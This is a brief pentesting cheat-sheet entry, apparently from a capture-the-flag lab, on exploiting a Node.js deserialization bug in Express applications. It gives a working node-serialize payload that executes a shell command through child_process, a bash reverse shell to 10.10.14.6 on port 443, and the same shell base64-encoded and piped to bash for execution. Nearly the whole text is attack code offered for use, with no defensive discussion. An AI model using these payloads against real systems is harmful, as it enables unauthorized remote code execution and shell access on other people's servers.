_____

# Express framework

_Express_ is a minimal and flexible _Node_._js_ web application _framework_ that provides a robust set of features for web and mobile applications. APIs.

- server.js

# Deserialization attack

https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/

## unserialize 

```js
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('ping -c 1 10.10.14.6', function(error, stdout, stderr){console.log(stdout)});}()"}
```

```bash
echo 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1' | base64
```

```bash
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42LzQ0MyAwPiYxCg==|base64 -d |bash
```
